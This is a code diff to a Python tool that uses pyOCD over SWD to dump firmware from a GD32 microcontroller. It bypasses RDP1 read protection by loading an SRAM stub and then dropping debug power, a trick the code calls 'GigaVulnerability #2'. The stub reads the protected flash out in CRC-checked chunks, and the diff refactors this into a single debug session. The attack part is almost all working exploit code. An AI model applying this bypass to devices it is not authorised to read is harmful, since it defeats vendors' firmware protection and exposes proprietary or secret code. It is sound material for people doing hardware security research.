@@ -285,127 +285,123 @@ def dump_via_swd_mem(out_path: Path = FACTORY_IMAGE, total_size: int = 65536) ->
     out_buf = bytearray()
     t_start = time.time()
 
-    for off in range(0, total_size, CHUNK_SIZE):
-        chunk_len = min(CHUNK_SIZE, total_size - off)
-        target_addr = FLASH_BASE + off
-        chunk_ok = False
+    s = ConnectHelper.session_with_chosen_probe(
+        target_override="cortex_m",
+        options={"connect_mode": "attach", "frequency": 1000000},
+    )
+    s.open()
+    try:
+        target = s.board.target
+        core = target.selected_core
 
-        for attempt in range(1, 5):
-            # 1. Attach, reset+halt (stops any running watchdog), load stub + mailbox,
-            #    resume, and immediately drop CDBGPWRUPREQ (writedp 0x4 0x0) so the
-            #    GD32 FMC permits SRAM code to read RDP1-protected Flash.
-            s = None
-            try:
-                s = ConnectHelper.session_with_chosen_probe(
-                    target_override="cortex_m",
-                    options={"connect_mode": "attach", "frequency": 100000},
-                )
-                s.open()
-                target = s.board.target
-                target.reset_and_halt()
-                target.write_memory_block8(0x20000000, bin_data)
-                target.write32(MAILBOX_ADDR + 0x00, DUMP_MAGIC)
-                target.write32(MAILBOX_ADDR + 0x08, 0)  # status = BUSY
-                target.write32(MAILBOX_ADDR + 0x0C, target_addr)
-                target.write32(MAILBOX_ADDR + 0x10, chunk_len)
-                target.write32(MAILBOX_ADDR + 0x14, 0)
-                target.write32(MAILBOX_ADDR + 0x04, 1)  # cmd = DUMP_CHUNK
+        def start_stub_with_chunk(target_addr: int, chunk_len: int) -> None:
+            target.dp.power_up_debug()
+            target.halt()
+            target.write_memory_block8(0x20000000, bin_data)
+            target.write32(MAILBOX_ADDR + 0x00, DUMP_MAGIC)
+            target.write32(MAILBOX_ADDR + 0x08, 0)  # status = BUSY
+            target.write32(MAILBOX_ADDR + 0x0C, target_addr)
+            target.write32(MAILBOX_ADDR + 0x10, chunk_len)
+            target.write32(MAILBOX_ADDR + 0x14, 0)
+            target.write32(MAILBOX_ADDR + 0x04, 1)  # cmd = DUMP_CHUNK
+            core.write_core_register_raw("sp", 0x20002000)
+            core.write_core_register_raw("pc", pc)
+            core.write_core_register_raw("xpsr", 0x01000000)
+            target.resume()
+            # Clear C_DEBUGEN in DHCSR + DEMCR, then power down debug port (CDBGPWRUPREQ=0)
+            # so GD32 FMC permits SRAM stub to read RDP1-protected Flash.
+            target.write32(0xE000EDF0, 0xA05F0000)
+            target.write32(0xE000EDFC, 0)
+            target.dp.power_down_debug()
 
-                core = target.selected_core
-                core.write_core_register_raw("sp", 0x20002000)
-                core.write_core_register_raw("pc", pc)
-                core.write_core_register_raw("xpsr", 0x01000000)
-                target.resume()
+        stub_running = False
 
-                # GigaVulnerability #2: drop CDBGPWRUPREQ so SRAM stub can read Flash
-                target.dp.write_reg(0x04, 0x00000000)
-                target.dp.flush()
-            except Exception as e:
+        for off in range(0, total_size, CHUNK_SIZE):
+            chunk_len = min(CHUNK_SIZE, total_size - off)
+            target_addr = FLASH_BASE + off
+            chunk_ok = False
+
+            for attempt in range(1, 5):
+                try:
+                    if not stub_running or attempt > 1:
+                        start_stub_with_chunk(target_addr, chunk_len)
+                        stub_running = True
+                    else:
+                        target.write32(MAILBOX_ADDR + 0x08, 0)  # status = BUSY
+                        target.write32(MAILBOX_ADDR + 0x0C, target_addr)
+                        target.write32(MAILBOX_ADDR + 0x10, chunk_len)
+                        target.write32(MAILBOX_ADDR + 0x04, 1)  # cmd = DUMP_CHUNK
+                        target.write32(0xE000EDF0, 0xA05F0000)
+                        target.write32(0xE000EDFC, 0)
+                        target.dp.power_down_debug()
+
+                    # Wait for SRAM stub (~15 ms delay + 4 KB copy & CRC-16)
+                    time.sleep(0.20)
+
+                    # Re-enable debug power in the same session to read SRAM mailbox
+                    target.dp.power_up_debug()
+
+                    for _poll in range(10):
+                        magic = target.read32(MAILBOX_ADDR + 0x00)
+                        cmd = target.read32(MAILBOX_ADDR + 0x04)
+                        status = target.read32(MAILBOX_ADDR + 0x08)
+                        if magic == DUMP_MAGIC and cmd == 0 and status == 1:
+                            break
+                        time.sleep(0.02)
+                    else:
+                        raise RuntimeError(
+                            f"mailbox not ready (magic=0x{magic:08X}, cmd={cmd}, status={status})"
+                        )
+
+                    crc_seq = target.read32(MAILBOX_ADDR + 0x14)
+                    dev_crc = crc_seq & 0xFFFF
+
+                    raw_chunk = bytes(target.read_memory_block8(MAILBOX_ADDR + 0x18, chunk_len))
+                    calc_crc = crc16_ccitt(raw_chunk)
+                    if calc_crc != dev_crc:
+                        raise RuntimeError(
+                            f"CRC mismatch on chunk 0x{target_addr:08X}: "
+                            f"host=0x{calc_crc:04X} != dev=0x{dev_crc:04X}"
+                        )
+
+                    if off == 0 and (
+                        raw_chunk == b"\xff" * chunk_len or raw_chunk == b"\x00" * chunk_len
+                    ):
+                        raise RuntimeError(
+                            "chunk 0 at 0x08000000 read back blank (RDP still blocking read)"
+                        )
+
+                    out_buf.extend(raw_chunk)
+                    chunk_ok = True
+                    break
+                except Exception as e:
+                    stub_running = False
+                    print(
+                        f"\n[swd-dump] chunk 0x{target_addr:08X} attempt {attempt} failed ({e})",
+                        file=sys.stderr,
+                    )
+                    time.sleep(0.1)
+
+            if not chunk_ok:
                 print(
-                    f"\n[swd-dump] chunk 0x{target_addr:08X} start attempt {attempt} failed ({e})",
+                    f"\n[swd-dump] ERROR: failed to dump chunk at 0x{target_addr:08X} after 4 attempts",
                     file=sys.stderr,
                 )
-                if s is not None:
-                    try:
-                        s.close()
-                    except Exception:
-                        pass
-                time.sleep(0.3)
-                continue
-            finally:
-                if s is not None:
-                    try:
-                        s.close()
-                    except Exception:
-                        pass
+                return 1
 
-            # 2. Wait for the SRAM stub (~80 ms delay + 4 KB copy + CRC-16)
-            time.sleep(0.22)
-
-            # 3. Re-attach (without reset!) to read the 4 KB buffer from SRAM
-            s_read = None
-            try:
-                s_read = ConnectHelper.session_with_chosen_probe(
-                    target_override="cortex_m",
-                    options={"connect_mode": "attach", "frequency": 100000},
-                )
-                s_read.open()
-                target_r = s_read.board.target
-                magic = target_r.read32(MAILBOX_ADDR + 0x00)
-                cmd = target_r.read32(MAILBOX_ADDR + 0x04)
-                status = target_r.read32(MAILBOX_ADDR + 0x08)
-                crc_seq = target_r.read32(MAILBOX_ADDR + 0x14)
-                dev_crc = crc_seq & 0xFFFF
-
-                if magic != DUMP_MAGIC or cmd != 0 or status != 1:
-                    raise RuntimeError(
-                        f"mailbox not ready (magic=0x{magic:08X}, cmd={cmd}, status={status})"
-                    )
-
-                raw_chunk = bytes(target_r.read_memory_block8(MAILBOX_ADDR + 0x18, chunk_len))
-                calc_crc = crc16_ccitt(raw_chunk)
-                if calc_crc != dev_crc:
-                    raise RuntimeError(
-                        f"CRC mismatch on chunk 0x{target_addr:08X}: "
-                        f"host=0x{calc_crc:04X} != dev=0x{dev_crc:04X}"
-                    )
-
-                if off == 0 and (
-                    raw_chunk == b"\xff" * chunk_len or raw_chunk == b"\x00" * chunk_len
-                ):
-                    raise RuntimeError(
-                        "chunk 0 at 0x08000000 read back blank (RDP still blocking read)"
-                    )
-
-                out_buf.extend(raw_chunk)
-                chunk_ok = True
-                break
-            except Exception as e:
-                print(
-                    f"\n[swd-dump] chunk 0x{target_addr:08X} read attempt {attempt} failed ({e})",
-                    file=sys.stderr,
-                )
-                time.sleep(0.3)
-            finally:
-                if s_read is not None:
-                    try:
-                        s_read.close()
-                    except Exception:
-                        pass
-
-        if not chunk_ok:
+            done_bytes = len(out_buf)
             print(
-                f"\n[swd-dump] ERROR: failed to dump chunk at 0x{target_addr:08X} after 4 attempts",
-                file=sys.stderr,
+                f"\r[swd-dump] Dumped {done_bytes}/{total_size} bytes ({done_bytes * 100 // total_size}%)",
+                end="",
+                flush=True,
             )
-            return 1
-
-        done_bytes = len(out_buf)
-        print(
-            f"\r[swd-dump] Dumped {done_bytes}/{total_size} bytes ({done_bytes * 100 // total_size}%)",
-            end="",
-            flush=True,
-        )
+    finally:
+        try:
+            s.board.target.dp.write_reg(0x04, 0x50000000)
+            s.board.target.dp.flush()
+        except Exception:
+            pass
+        s.close()
 
     print()
     dt = time.time() - t_start
@@ -413,8 +409,7 @@ def dump_via_swd_mem(out_path: Path = FACTORY_IMAGE, total_size: int = 65536) ->
     out_path.write_bytes(bytes(out_buf))
     full_crc = crc16_ccitt(bytes(out_buf))
     print(
-        f"[swd-dump] Saved {len(out_buf)} bytes to {out_path} in {dt:.2f}s "
-        f"(CRC16=0x{full_crc:04X})"
+        f"[swd-dump] Saved {len(out_buf)} bytes to {out_path} in {dt:.2f}s (CRC16=0x{full_crc:04X})"
     )
     return 0
 
@@ -440,7 +435,7 @@ def unlock_via_swd_mem() -> int:
             )
             s.open()
             target = s.board.target
-            target.reset_and_halt()
+            target.halt()
             session = s
             break
         except Exception as e:
